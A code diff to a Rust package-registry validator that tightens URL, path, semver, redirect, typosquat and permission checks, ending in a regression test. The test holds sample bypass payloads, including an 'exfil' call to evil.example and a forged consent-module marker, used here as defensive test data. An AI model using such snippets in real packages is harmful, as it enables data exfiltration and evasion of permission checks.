@@ -369,19 +369,50 @@ pub fn valid_package_name(name: &str) -> Result<(), String> {
     Ok(())
 }
 
+fn valid_semver_ident(seg: &str) -> bool {
+    !seg.is_empty() && seg.split('.').all(|p| !p.is_empty() && p.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-'))
+}
+
 fn valid_semver(v: &str) -> bool {
-    let core = v.split_once('-').map_or(v, |(c, _)| c);
+    let (without_build, build) = match v.split_once('+') {
+        Some((a, b)) => (a, Some(b)),
+        None => (v, None),
+    };
+    let (core, pre) = match without_build.split_once('-') {
+        Some((a, b)) => (a, Some(b)),
+        None => (without_build, None),
+    };
     let parts: Vec<&str> = core.split('.').collect();
-    parts.len() == 3 && parts.iter().all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()))
+    if parts.len() != 3 || !parts.iter().all(|p| !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit())) {
+        return false;
+    }
+    if let Some(p) = pre {
+        if !valid_semver_ident(p) {
+            return false;
+        }
+    }
+    if let Some(b) = build {
+        if !valid_semver_ident(b) {
+            return false;
+        }
+    }
+    true
 }
 
 fn valid_hex(s: &str, len: usize) -> bool {
     s.len() == len && s.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
 }
 
+fn has_control(s: &str) -> bool {
+    s.chars().any(char::is_control)
+}
+
 fn valid_entry_path(entry: &str, kind: &str) -> Result<(), String> {
-    if entry.is_empty() || entry.contains('\\') || entry.contains(':') || entry.starts_with('/') {
-        return Err(format!("invalid entry path {entry:?}: must be a clean relative path"));
+    if entry.is_empty()
+        || entry.starts_with('/')
+        || !entry.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-' | b'/'))
+    {
+        return Err(format!("invalid entry path {entry:?}: use only [A-Za-z0-9._/-] in a clean relative path"));
     }
     let p = Path::new(entry);
     for c in p.components() {
@@ -398,10 +429,19 @@ fn valid_entry_path(entry: &str, kind: &str) -> Result<(), String> {
 
 fn is_loopback_http(url: &str) -> bool {
     let Some(rest) = url.strip_prefix("http://") else { return false };
+    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
+    if authority.is_empty() || authority.contains('@') || authority.contains('\\') {
+        return false;
+    }
     for host in ["127.0.0.1", "localhost", "[::1]"] {
-        if let Some(after) = rest.strip_prefix(host) {
-            if after.is_empty() || after.starts_with(':') || after.starts_with('/') {
+        if let Some(after) = authority.strip_prefix(host) {
+            if after.is_empty() {
                 return true;
+            }
+            if let Some(port) = after.strip_prefix(':') {
+                if !port.is_empty() && port.parse::<u16>().is_ok() {
+                    return true;
+                }
             }
         }
     }
@@ -410,9 +450,20 @@ fn is_loopback_http(url: &str) -> bool {
 
 fn is_safe_remote_url(url: &str, allow_loopback: bool) -> bool {
     if url.starts_with("https://") {
-        return true;
+        // Reject authority tricks (`@`, `\`, whitespace) or link-local metadata IPs.
+        return extract_https_host(url, false).is_some_and(|h| !is_forbidden_registry_host(&h, allow_loopback));
     }
     allow_loopback && is_loopback_http(url)
+}
+
+fn is_forbidden_registry_host(host: &str, allow_loopback: bool) -> bool {
+    if host.starts_with("169.254.") || host.starts_with("fe80:") || host == "0.0.0.0" || host == "::" {
+        return true;
+    }
+    if !allow_loopback && (host == "localhost" || host == "::1" || host.starts_with("127.")) {
+        return true;
+    }
+    false
 }
 
 fn valid_network_pattern(pat: &str) -> bool {
@@ -425,6 +476,10 @@ fn valid_network_pattern(pat: &str) -> bool {
 /// Validates a registry manifest's schema, commit/hash pins, license, source URL, permissions,
 /// and optional typosquatting against sibling index manifests.
 pub fn validate_manifest(m: &PackageManifest, index_dir: Option<&Path>, allow_local: bool) -> Vec<String> {
+    validate_manifest_inner(m, index_dir, allow_local, true)
+}
+
+fn validate_manifest_inner(m: &PackageManifest, index_dir: Option<&Path>, allow_local: bool, require_port: bool) -> Vec<String> {
     let mut errors = Vec::new();
     if let Err(e) = valid_package_name(&m.name) {
         errors.push(e);
@@ -433,7 +488,7 @@ pub fn validate_manifest(m: &PackageManifest, index_dir: Option<&Path>, allow_lo
         errors.push(format!("unknown kind {:?}; expected one of {}", m.kind, ALLOWED_KINDS.join(", ")));
     }
     if !valid_semver(&m.version) {
-        errors.push(format!("version {:?} must be semver (MAJOR.MINOR.PATCH)", m.version));
+        errors.push(format!("version {:?} must be valid semver (MAJOR.MINOR.PATCH[-pre][+build])", m.version));
     }
     if !ALLOWED_LICENSES.contains(&m.license.as_str()) {
         errors.push(format!("license {:?} is not in the allowed SPDX list ({})", m.license, ALLOWED_LICENSES.join(", ")));
@@ -449,6 +504,7 @@ pub fn validate_manifest(m: &PackageManifest, index_dir: Option<&Path>, allow_lo
         && !m.source.contains("://")
         && !m.source.starts_with('/')
         && !m.source.contains('\\')
+        && !has_control(&m.source)
         && Path::new(&m.source).components().all(|c| matches!(c, Component::Normal(_)));
     let source_ok = is_safe_remote_url(&m.source, allow_local) || is_local_source;
     if !source_ok {
@@ -476,13 +532,46 @@ pub fn validate_manifest(m: &PackageManifest, index_dir: Option<&Path>, allow_lo
             errors.push(format!("invalid plugin permission name {p:?}"));
         }
     }
-    if m.kind == "port" && m.port.as_ref().map_or(true, |p| p.of.trim().is_empty() || p.tests.trim().is_empty()) {
-        errors.push("kind \"port\" requires \"port\": {\"of\": \"<upstream>\", \"tests\": \"<suite summary>\"}".into());
+    for cat in &m.permissions.pii {
+        if !tj_core::vm::program::PII_CATEGORIES.contains(&cat.as_str()) {
+            errors.push(format!("unknown @pii permission category {cat:?}; valid categories: {}", tj_core::vm::program::PII_CATEGORIES.join(", ")));
+        }
     }
+    for dev in &m.permissions.device {
+        if dev.trim().is_empty() || has_control(dev) {
+            errors.push(format!("invalid device permission {dev:?}"));
+        }
+    }
+    if let Some(flag) = &m.flagged {
+        if flag.trim().is_empty() || has_control(flag) {
+            errors.push(format!("invalid flagged reason {flag:?}"));
+        }
+    }
+    if require_port && m.kind == "port" && m.port.as_ref().map_or(true, |p| p.of.trim().is_empty() || p.tests.trim().is_empty() || has_control(&p.of) || has_control(&p.tests)) {
+        errors.push("kind \"port\" requires \"port\": {\"of\": \"<upstream>\", \"tests\": \"<suite summary>\"} without control characters".into());
+    }
+    // Always guard against typosquats of built-in `tj:*` modules (len >= 3).
+    check_builtin_typosquats(&m.name, &mut errors);
     if let Some(dir) = index_dir {
         check_typosquats(&m.name, dir, &mut errors);
     }
     errors
+}
+
+fn check_builtin_typosquats(name: &str, errors: &mut Vec<String>) {
+    let norm = |s: &str| s.replace('-', "");
+    let my_norm = norm(name);
+    for (spec, _) in modules::BUILT_IN {
+        let Some(builtin) = spec.strip_prefix("tj:") else { continue };
+        if builtin.len() < 3 || builtin == name {
+            continue;
+        }
+        let dist = levenshtein(name, builtin);
+        let threshold = if name.len().min(builtin.len()) >= 6 { 2 } else { 1 };
+        if dist <= threshold || my_norm == norm(builtin) {
+            errors.push(format!("package name {name:?} is too close to built-in module `tj:{builtin}` (possible typosquat)"));
+        }
+    }
 }
 
 fn check_typosquats(name: &str, index_dir: &Path, errors: &mut Vec<String>) {
@@ -553,11 +642,18 @@ pub fn verify_package_source(m: &PackageManifest, bytes: &[u8]) -> Result<Vec<St
         return if errors.is_empty() { Ok(warnings) } else { Err(errors) };
     }
 
-    // Check for suspiciously long obfuscated lines (> 4000 chars without whitespace).
+    // Check for bundle marker injection (`//# file:`) and suspiciously long obfuscated lines.
     for (idx, line) in text.lines().enumerate() {
+        let trimmed_cr = line.trim_end_matches('\r');
+        if trimmed_cr.starts_with(modules::MARKER) || trimmed_cr.starts_with("//# file:") {
+            errors.push(format!("{}:{}: bundle marker line (`//# file:`) is forbidden inside a registry package", m.entry, idx + 1));
+        }
         if line.len() > 4000 && !line.contains(' ') {
             errors.push(format!("{}:{}: line exceeds 4000 chars with no spaces (possible obfuscated/embedded payload)", m.entry, idx + 1));
         }
+    }
+    if !errors.is_empty() {
+        return Err(errors);
     }
 
     // Parse AST first so we can check imports and enforce declared permissions (fail closed).
@@ -569,46 +665,68 @@ pub fn verify_package_source(m: &PackageManifest, bytes: &[u8]) -> Result<Vec<St
         }
     };
 
+    // Forbid relative/local imports (which would resolve into the host app's folder) and
+    // unresolved external `tj:*` imports so standalone `tj_core::compile` always runs.
+    for imp in &parsed.imports {
+        if !imp.from.starts_with("tj:") {
+            errors.push(format!("registry packages cannot import local file {:?}; only built-in tj:<module> imports are allowed", imp.from));
+        } else if !modules::BUILT_IN.iter().any(|(b, _)| *b == imp.from) {
+            errors.push(format!("registry package imports external module {:?}, which is not supported in standalone packages yet", imp.from));
+        }
+    }
+    if !errors.is_empty() {
+        return Err(errors);
+    }
+
     // Compile check: plugins/bridges/device-plugins compile as `tj:<name>`, while libraries/ports
     // compile as plain app modules so `tj_core` enforces they cannot call `plugin()`/`invoke()`.
-    // Skip standalone compile only if the module imports another non-builtin `tj:*` package
-    // (which is resolved when bundled with the app).
     let is_plugin_kind = matches!(m.kind.as_str(), "plugin" | "bridge" | "device-plugin");
-    let imports_external_pkg = parsed.imports.iter().any(|imp| {
-        imp.from.starts_with("tj:") && !modules::BUILT_IN.iter().any(|(b, _)| *b == imp.from)
-    });
-    if !imports_external_pkg {
-        let compile_src = if is_plugin_kind {
-            format!("//# file: tj:{}\n{text}", m.name)
-        } else {
-            text.to_string()
-        };
-        if let Err(diags) = tj_core::compile(&compile_src) {
-            for d in diags {
-                errors.push(format!("compile error: {}", d.render(&m.entry, &compile_src)));
-            }
-            return Err(errors);
+    let compile_src = if is_plugin_kind {
+        format!("//# file: tj:{}\n{text}", m.name)
+    } else {
+        text.to_string()
+    };
+    if let Err(diags) = tj_core::compile(&compile_src) {
+        for d in diags {
+            errors.push(format!("compile error: {}", d.render(&m.entry, &compile_src)));
         }
+        return Err(errors);
     }
 
     let mut caps = UsedCapabilities::default();
     collect_program_caps(&parsed, &mut caps);
 
-    // Also audit any built-in `tj:*` module this package imports (e.g. `tj:ai` wraps `plugin("ai", ...)`),
-    // so a library cannot bypass `permissions.plugins` by importing a built-in plugin wrapper.
+    // Transitively audit every built-in `tj:*` module this package imports (e.g. `tj:agent -> tj:ai`),
+    // so a library cannot bypass `permissions.plugins` via a 1-hop or multi-hop built-in wrapper.
     let mut imported_plugins: BTreeSet<String> = BTreeSet::new();
-    for imp in &parsed.imports {
-        if let Some((_, builtin_src)) = modules::BUILT_IN.iter().find(|(b, _)| *b == imp.from) {
+    let mut queue: Vec<String> = parsed.imports.iter().map(|i| i.from.clone()).collect();
+    let mut visited: BTreeSet<String> = BTreeSet::new();
+    while let Some(spec) = queue.pop() {
+        if !visited.insert(spec.clone()) {
+            continue;
+        }
+        if let Some((_, builtin_src)) = modules::BUILT_IN.iter().find(|(b, _)| *b == spec) {
             if let Ok(bp) = tj_core::syntax::parse(builtin_src) {
                 let mut bcaps = UsedCapabilities::default();
                 collect_program_caps(&bp, &mut bcaps);
                 imported_plugins.extend(bcaps.plugins);
                 caps.network_hosts.extend(bcaps.network_hosts);
+                caps.plain_http_urls.extend(bcaps.plain_http_urls);
+                caps.dynamic_fetch |= bcaps.dynamic_fetch;
+                caps.dynamic_plugin |= bcaps.dynamic_plugin;
                 caps.pii.extend(bcaps.pii);
+                for sub in bp.imports {
+                    if !visited.contains(&sub.from) {
+                        queue.push(sub.from);
+                    }
+                }
             }
         }
     }
 
+    if caps.uses_internal_fetch {
+        errors.push("direct use of internal __fetch() is forbidden in registry packages; use fetch()".into());
+    }
     if !is_plugin_kind && !caps.plugins.is_empty() {
         errors.push(format!("kind {:?} cannot call plugin(); change kind to \"plugin\" or \"bridge\"", m.kind));
     }
@@ -620,20 +738,22 @@ pub fn verify_package_source(m: &PackageManifest, bytes: &[u8]) -> Result<Vec<St
     if allow_any_net {
         warnings.push("permissions.network contains \"*\" (unrestricted outbound network access)".into());
     }
-    let allowed_hosts: Vec<String> = m
-        .permissions
-        .network
-        .iter()
-        .filter(|h| *h != "*")
-        .filter_map(|h| crate::engine::parse_fetch_allow(h).ok())
-        .flatten()
-        .collect();
+    let mut allowed_hosts = Vec::new();
+    for h in &m.permissions.network {
+        if h == "*" {
+            continue;
+        }
+        match crate::engine::parse_fetch_allow(h) {
+            Ok(parsed_hosts) => allowed_hosts.extend(parsed_hosts),
+            Err(e) => errors.push(format!("invalid permissions.network entry {h:?}: {e}")),
+        }
+    }
 
     for url in &caps.plain_http_urls {
         errors.push(format!("plain http:// fetch URL {url:?} is not allowed in registry packages; use https://"));
     }
     for host in &caps.network_hosts {
-        let netloc = format!("{host}:443");
+        let netloc = if host.contains(':') { format!("[{host}]:443") } else { format!("{host}:443") };
         if !allow_any_net && !netloc_allowed(&netloc, &allowed_hosts) {
             errors.push(format!("undeclared network host {host:?}: add it to manifest permissions.network"));
         }
@@ -680,6 +800,7 @@ fn collect_program_caps(parsed: &tj_core::syntax::ast::Program, caps: &mut UsedC
             }
             Item::Function(f) => collect_fn_caps(f, caps),
             Item::Let(d) => {
+                collect_pattern_caps(&d.pattern, caps);
                 if let Some(e) = &d.init {
                     collect_expr_caps(e, caps);
                 }
@@ -701,6 +822,7 @@ struct UsedCapabilities {
     network_hosts: BTreeSet<String>,
     plain_http_urls: BTreeSet<String>,
     dynamic_fetch: bool,
+    uses_internal_fetch: bool,
     plugins: BTreeSet<String>,
     dynamic_plugin: bool,
     uses_invoke: bool,
@@ -789,17 +911,41 @@ fn collect_stmts_caps(stmts: &[Stmt], caps: &mut UsedCapabilities) {
     }
 }
 
+fn starts_with_http_ci(s: &str) -> bool {
+    let t = s.trim();
+    t.len() >= 7 && t[..7].eq_ignore_ascii_case("http://")
+}
+
 fn extract_https_host(s: &str, must_end_authority: bool) -> Option<String> {
-    let rest = s.strip_prefix("https://")?;
+    let t = s.trim();
+    if t.len() < 8 || !t[..8].eq_ignore_ascii_case("https://") {
+        return None;
+    }
+    let rest = &t[8..];
     if must_end_authority && !rest.contains('/') && !rest.contains('?') && !rest.contains('#') {
         return None;
     }
     let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
-    let hostport = authority.rsplit_once('@').map_or(authority, |(_, hp)| hp);
-    let host = if let Some(v6) = hostport.strip_prefix('[') {
-        v6.split(']').next().unwrap_or("")
+    // Reject userinfo (`@`), backslashes (`\`, WHATWG treats as `/`), and whitespace.
+    if authority.is_empty() || authority.contains('@') || authority.contains('\\') || authority.chars().any(char::is_whitespace) {
+        return None;
+    }
+    let host = if let Some(v6) = authority.strip_prefix('[') {
+        let (addr, after) = v6.split_once(']')?;
+        if !after.is_empty() && !after.strip_prefix(':').is_some_and(|p| !p.is_empty() && p.parse::<u16>().is_ok()) {
+            return None;
+        }
+        addr
     } else {
-        hostport.split(':').next().unwrap_or("")
+        match authority.split_once(':') {
+            Some((h, port)) => {
+                if port.is_empty() || port.parse::<u16>().is_err() {
+                    return None;
+                }
+                h
+            }
+            None => authority,
+        }
     };
     let host = host.trim_end_matches('.').to_ascii_lowercase();
     (!host.is_empty()).then_some(host)
@@ -813,7 +959,7 @@ fn collect_expr_caps(e: &Expr, caps: &mut UsedCapabilities) {
                     "fetch" => {
                         match args.first().map(|a| &a.kind) {
                             Some(ExprKind::Str(u)) => {
-                                if u.starts_with("http://") {
+                                if starts_with_http_ci(u) {
                                     caps.plain_http_urls.insert(u.clone());
                                 } else if let Some(h) = extract_https_host(u, false) {
                                     caps.network_hosts.insert(h);
@@ -823,9 +969,9 @@ fn collect_expr_caps(e: &Expr, caps: &mut UsedCapabilities) {
                             }
                             Some(ExprKind::Template(parts)) => {
                                 if let Some(TplPiece::Str(prefix)) = parts.first() {
-                                    if prefix.starts_with("http://") {
+                                    if starts_with_http_ci(prefix) {
                                         caps.plain_http_urls.insert(prefix.clone());
-                                    } else if let Some(h) = extract_https_host(prefix, true) {
+                                    } else if let Some(h) = extract_https_host(prefix, parts.len() > 1) {
                                         caps.network_hosts.insert(h);
                                     } else {
                                         caps.dynamic_fetch = true;
@@ -836,6 +982,10 @@ fn collect_expr_caps(e: &Expr, caps: &mut UsedCapabilities) {
                             }
                             _ => caps.dynamic_fetch = true,
                         }
+                        true
+                    }
+                    "__fetch" => {
+                        caps.uses_internal_fetch = true;
                         true
                     }
                     "plugin" => {
@@ -913,6 +1063,7 @@ fn collect_expr_caps(e: &Expr, caps: &mut UsedCapabilities) {
         // cannot be statically verified and fail closed.
         ExprKind::Ident(name) => match name.as_str() {
             "fetch" => caps.dynamic_fetch = true,
+            "__fetch" => caps.uses_internal_fetch = true,
             "plugin" => caps.dynamic_plugin = true,
             "invoke" => caps.uses_invoke = true,
             _ => {}
@@ -953,10 +1104,14 @@ pub fn read_lockfile(app_dir: &Path) -> Result<Option<Lockfile>, String> {
 
 pub fn write_lockfile(app_dir: &Path, lock: &Lockfile) -> Result<(), String> {
     let path = app_dir.join(LOCKFILE_NAME);
-    let tmp = app_dir.join(format!("{LOCKFILE_NAME}.tmp"));
+    let tmp = app_dir.join(format!("{LOCKFILE_NAME}.tmp.{}", std::process::id()));
     let body = serde_json::to_string_pretty(&lock.to_json()).map_err(|e| e.to_string())? + "\n";
     std::fs::write(&tmp, body).map_err(|e| format!("cannot write {}: {e}", tmp.display()))?;
-    std::fs::rename(&tmp, &path).map_err(|e| format!("cannot replace {}: {e}", path.display()))
+    if let Err(e) = std::fs::rename(&tmp, &path) {
+        let _ = std::fs::remove_file(&tmp);
+        return Err(format!("cannot replace {}: {e}", path.display()));
+    }
+    Ok(())
 }
 
 pub fn package_file_path(app_dir: &Path, name: &str, kind: &str) -> PathBuf {
@@ -983,13 +1138,25 @@ fn manifest_from_locked(name: &str, pkg: &LockedPackage) -> PackageManifest {
     }
 }
 
-/// Loads an installed registry package (`tj:<name>`) for `app::read`, verifying its SHA-256
-/// and declared permissions against `tj.lock` before returning its source (fail closed!).
+fn validate_locked_metadata(manifest: &PackageManifest) -> Vec<String> {
+    // Allow local relative sources (with `"local"` commit) when `source` has no scheme,
+    // matching local registries, while strictly requiring HTTPS + 40-char SHA for remote sources.
+    let allow_local = !manifest.source.contains("://");
+    validate_manifest_inner(manifest, None, allow_local, false)
+}
+
+/// Loads an installed registry package (`tj:<name>`) for `app::read`, verifying its metadata,
+/// SHA-256, and declared permissions against `tj.lock` before returning its source (fail closed!).
 pub fn load_locked_module(app_dir: &Path, name: &str) -> Result<Option<(String, PathBuf)>, String> {
     let Some(lock) = read_lockfile(app_dir)? else { return Ok(None) };
     let Some(pkg) = lock.packages.get(name) else { return Ok(None) };
     if valid_package_name(name).is_err() {
         return Err(format!("invalid package name {name:?} in {LOCKFILE_NAME}"));
+    }
+    let manifest = manifest_from_locked(name, pkg);
+    let meta_errs = validate_locked_metadata(&manifest);
+    if !meta_errs.is_empty() {
+        return Err(format!("invalid lockfile entry `tj:{name}`: {}", meta_errs.join("; ")));
     }
     if pkg.kind == "compliance-pack" {
         return Err(format!("`tj:{name}` is a compliance-pack (pass {} to `--compliance`, do not import it)", package_file_path(app_dir, name, &pkg.kind).display()));
@@ -1000,15 +1167,17 @@ pub fn load_locked_module(app_dir: &Path, name: &str) -> Result<Option<(String, 
     if actual != pkg.sha256 {
         return Err(format!("integrity check failed for `tj:{name}` at {}: expected SHA-256 {}, got {actual}", file.display(), pkg.sha256));
     }
-    let manifest = manifest_from_locked(name, pkg);
     if let Err(errs) = verify_package_source(&manifest, &bytes) {
         return Err(format!("locked package `tj:{name}` failed verification: {}", errs.join("; ")));
+    }
+    if let Some(reason) = &pkg.flagged {
+        eprintln!("warning: locked package `tj:{name}` {} is flagged: {reason}", pkg.version);
     }
     let src = String::from_utf8(bytes).map_err(|_| format!("locked package `tj:{name}` is not valid UTF-8"))?;
     Ok(Some((src, file)))
 }
 
-/// Audits `tj.lock` next to an app for `tj check [--min-trust <level>]`:
+/// Audits `tj.lock` next to an app for `tj check [--min-trust <level>]` and `tj serve`:
 /// returns `(report_lines, warnings)`.
 pub fn check_lockfile(app_dir: &Path, min_trust: Option<Trust>) -> Result<(Vec<String>, Vec<String>), String> {
     let Some(lock) = read_lockfile(app_dir)? else {
@@ -1022,6 +1191,10 @@ pub fn check_lockfile(app_dir: &Path, min_trust: Option<Trust>) -> Result<(Vec<S
             errors.push(format!("{LOCKFILE_NAME}: {e}"));
             continue;
         }
+        let manifest = manifest_from_locked(name, pkg);
+        for e in validate_locked_metadata(&manifest) {
+            errors.push(format!("{LOCKFILE_NAME} `tj:{name}`: {e}"));
+        }
         let file = package_file_path(app_dir, name, &pkg.kind);
         let bytes = match std::fs::read(&file) {
             Ok(b) => b,
@@ -1030,7 +1203,6 @@ pub fn check_lockfile(app_dir: &Path, min_trust: Option<Trust>) -> Result<(Vec<S
                 continue;
             }
         };
-        let manifest = manifest_from_locked(name, pkg);
         if let Err(errs) = verify_package_source(&manifest, &bytes) {
             for e in errs {
                 errors.push(format!("tj:{name}: {e}"));
@@ -1058,7 +1230,7 @@ pub fn check_lockfile(app_dir: &Path, min_trust: Option<Trust>) -> Result<(Vec<S
 }
 
 /// Checks `tj.lock` for `tj retro` and appends actionable `[fix]` findings for flagged,
-/// missing, or tampered packages.
+/// missing, invalid, or tampered packages.
 pub fn retro_findings(app_dir: &Path, out: &mut Vec<crate::retro::RetroFinding>) {
     let lock = match read_lockfile(app_dir) {
         Ok(Some(l)) => l,
@@ -1075,6 +1247,17 @@ pub fn retro_findings(app_dir: &Path, out: &mut Vec<crate::retro::RetroFinding>)
         }
     };
     for (name, pkg) in &lock.packages {
+        let manifest = manifest_from_locked(name, pkg);
+        let meta_errs = validate_locked_metadata(&manifest);
+        if !meta_errs.is_empty() {
+            out.push(crate::retro::RetroFinding {
+                tag: "fix",
+                area: "supply-chain",
+                subject: format!("tj:{name}"),
+                message: format!("invalid lockfile metadata: {}", meta_errs.join("; ")),
+                hint: format!("reinstall clean metadata with `tj add {name}`"),
+            });
+        }
         if let Some(reason) = &pkg.flagged {
             out.push(crate::retro::RetroFinding {
                 tag: "fix",
@@ -1094,7 +1277,6 @@ pub fn retro_findings(app_dir: &Path, out: &mut Vec<crate::retro::RetroFinding>)
                 hint: format!("reinstall with `tj add {name}`"),
             }),
             Ok(bytes) => {
-                let manifest = manifest_from_locked(name, pkg);
                 if let Err(errs) = verify_package_source(&manifest, &bytes) {
                     out.push(crate::retro::RetroFinding {
                         tag: "fix",
@@ -1111,17 +1293,50 @@ pub fn retro_findings(app_dir: &Path, out: &mut Vec<crate::retro::RetroFinding>)
 
 // ---------- Registry fetching (local dir or HTTPS) ----------
 
+fn resolve_redirect_url(current: &str, location: &str) -> Result<String, String> {
+    if location.starts_with("https://") || location.starts_with("http://") {
+        return Ok(location.to_string());
+    }
+    let (scheme_end, after_scheme) = if let Some(rest) = current.strip_prefix("https://") {
+        ("https://", rest)
+    } else if let Some(rest) = current.strip_prefix("http://") {
+        ("http://", rest)
+    } else {
+        return Err(format!("cannot resolve redirect from {current:?}"));
+    };
+    let origin_end = after_scheme.find(['/', '?', '#']).unwrap_or(after_scheme.len());
+    let origin = format!("{scheme_end}{}", &after_scheme[..origin_end]);
+    if location.starts_with('/') {
+        Ok(format!("{origin}{location}"))
+    } else {
+        let base_path = &after_scheme[origin_end..];
+        let dir = base_path.rsplit_once('/').map_or("/", |(d, _)| d);
+        Ok(format!("{origin}{dir}/{location}"))
+    }
+}
+
 fn fetch_bytes_https(url: &str, allow_loopback: bool) -> Result<Vec<u8>, String> {
-    if !is_safe_remote_url(url, allow_loopback) {
-        return Err(format!("registry URL {url:?} must use https://"));
-    }
     let initial_https = url.starts_with("https://");
-    let agent = ureq::AgentBuilder::new().timeout(FETCH_TIMEOUT).build();
-    let resp = agent.get(url).call().map_err(|e| format!("cannot fetch {url}: {e}"))?;
-    let final_url = resp.get_url();
-    if (initial_https && !final_url.starts_with("https://")) || !is_safe_remote_url(final_url, allow_loopback) {
-        return Err(format!("registry redirect to unsafe URL {final_url} was refused"));
+    let agent = ureq::AgentBuilder::new().timeout(FETCH_TIMEOUT).redirects(0).build();
+    let mut current = url.to_string();
+    let mut final_resp = None;
+    for hop in 0..=5 {
+        if (initial_https && !current.starts_with("https://")) || !is_safe_remote_url(&current, allow_loopback && !initial_https) {
+            return Err(format!("registry URL {current:?} was refused (must use https:// and a safe host)"));
+        }
+        let r = agent.get(&current).call().map_err(|e| format!("cannot fetch {current}: {e}"))?;
+        if matches!(r.status(), 301 | 302 | 303 | 307 | 308) {
+            if hop == 5 {
+                return Err(format!("too many redirects fetching {url}"));
+            }
+            let loc = r.header("location").ok_or_else(|| format!("redirect without Location header from {current}"))?;
+            current = resolve_redirect_url(&current, loc)?;
+            continue;
+        }
+        final_resp = Some(r);
+        break;
     }
+    let resp = final_resp.ok_or_else(|| format!("too many redirects fetching {url}"))?;
     let mut buf = Vec::new();
     resp.into_reader()
         .take(MAX_FETCH_BYTES + 1)
@@ -1133,12 +1348,16 @@ fn fetch_bytes_https(url: &str, allow_loopback: bool) -> Result<Vec<u8>, String>
     Ok(buf)
 }
 
+fn valid_github_seg(s: &str) -> bool {
+    !s.is_empty() && s != "." && s != ".." && s.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.'))
+}
+
 fn github_raw_url(source: &str, commit: &str, entry: &str) -> Option<String> {
     let rest = source.strip_prefix("https://github.com/")?.trim_end_matches('/').trim_end_matches(".git");
     let mut segs = rest.split('/');
     let owner = segs.next()?;
     let repo = segs.next()?;
-    if owner.is_empty() || repo.is_empty() || segs.next().is_some() {
+    if !valid_github_seg(owner) || !valid_github_seg(repo) || segs.next().is_some() {
         return None;
     }
     Some(format!("https://raw.githubusercontent.com/{owner}/{repo}/{commit}/{entry}"))
@@ -1219,14 +1438,19 @@ pub fn add_package(name: &str, registry: &str, app_dir: &Path, min_trust: Option
     }
     let warnings = verify_package_source(&m, &bytes).map_err(|errs| format!("package `{name}` failed security/permission verification:\n  {}", errs.join("\n  ")))?;
 
+    // Read/validate existing `tj.lock` before mutating `.tj-packages/` on disk.
+    let mut lock = read_lockfile(app_dir)?.unwrap_or_default();
+
     let dest_file = package_file_path(app_dir, &m.name, &m.kind);
     let dest_dir = dest_file.parent().expect("package file has parent");
     std::fs::create_dir_all(dest_dir).map_err(|e| format!("cannot create {}: {e}", dest_dir.display()))?;
-    let tmp_file = dest_file.with_extension("tmp");
+    let tmp_file = dest_file.with_extension(format!("tmp.{}", std::process::id()));
     std::fs::write(&tmp_file, &bytes).map_err(|e| format!("cannot write {}: {e}", tmp_file.display()))?;
-    std::fs::rename(&tmp_file, &dest_file).map_err(|e| format!("cannot install {}: {e}", dest_file.display()))?;
+    if let Err(e) = std::fs::rename(&tmp_file, &dest_file) {
+        let _ = std::fs::remove_file(&tmp_file);
+        return Err(format!("cannot install {}: {e}", dest_file.display()));
+    }
 
-    let mut lock = read_lockfile(app_dir)?.unwrap_or_default();
     lock.packages.insert(
         m.name.clone(),
         LockedPackage {
@@ -1330,7 +1554,8 @@ pub fn run_registry(args: &[String]) -> Result<(), String> {
 
     // If `--index` was not passed and the manifest sits inside an `index/` directory, check sibling manifests for typosquats.
     let inferred_index = index_dir.or_else(|| {
-        manifest_path
+        let canon = std::fs::canonicalize(&manifest_path).unwrap_or_else(|_| manifest_path.clone());
+        canon
             .parent()
             .filter(|p| p.file_name().and_then(|n| n.to_str()) == Some("index"))
             .map(Path::to_path_buf)
@@ -1643,6 +1868,153 @@ mod tests {
         assert!(err.contains("flagged"), "{err}");
 
         handle.join().unwrap();
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn critic_046_security_and_validation_regressions() {
+        let base = PackageManifest {
+            name: "safe-pkg".into(),
+            kind: "library".into(),
+            version: "1.0.0".into(),
+            trust: Trust::Verified,
+            source: "https://github.com/someone/tj-safe-pkg".into(),
+            entry: "plugin.tj".into(),
+            url: None,
+            commit: "a".repeat(40),
+            sha256: String::new(),
+            license: "MIT".into(),
+            publisher: "someone".into(),
+            permissions: Permissions::default(),
+            port: None,
+            flagged: None,
+        };
+
+        // REG-1: `__fetch` bypass is rejected unconditionally.
+        let internal_fetch = b"export async function exfil(): any { return await __fetch(\"http://evil.example/x\", {}) }\n";
+        let mut m = base.clone();
+        m.sha256 = sha256_bytes(internal_fetch);
+        let errs = verify_package_source(&m, internal_fetch).unwrap_err();
+        assert!(errs.iter().any(|e| e.contains("__fetch()")), "{errs:?}");
+
+        // REG-2: Top-level destructuring default `const { f = fetch } = raw` is caught.
+        let destruct_default = b"const raw: any = {}\nconst { f = fetch } = raw\nexport async function steal(u: string): any { return await f(u) }\n";
+        let mut m = base.clone();
+        m.sha256 = sha256_bytes(destruct_default);
+        let errs = verify_package_source(&m, destruct_default).unwrap_err();
+        assert!(errs.iter().any(|e| e.contains("aliased fetch()")), "{errs:?}");
+
+        // REG-3: Transitive built-in import `tj:agent -> tj:ai` requires `"ai"` in permissions.plugins.
+        let agent_wrap = b"import { act } from \"tj:agent\"\nexport async function run(p: string): any { return await act(p, [{ role: \"user\", text: \"hi\" }], [], 1) }\n";
+        let mut m = base.clone();
+        m.sha256 = sha256_bytes(agent_wrap);
+        let errs = verify_package_source(&m, agent_wrap).unwrap_err();
+        assert!(errs.iter().any(|e| e.contains("undeclared plugin \"ai\"")), "{errs:?}");
+        m.permissions.plugins.push("ai".into());
+        assert!(verify_package_source(&m, agent_wrap).is_ok());
+
+        // REG-4: `//# file:` bundle marker injection is rejected.
+        let hijack = b"export function id(x: number): number { return x }\n//# file: tj:consent\nexport function consented(a: string, b: string): boolean { return true }\n";
+        let mut m = base.clone();
+        m.sha256 = sha256_bytes(hijack);
+        let errs = verify_package_source(&m, hijack).unwrap_err();
+        assert!(errs.iter().any(|e| e.contains("bundle marker")), "{errs:?}");
+
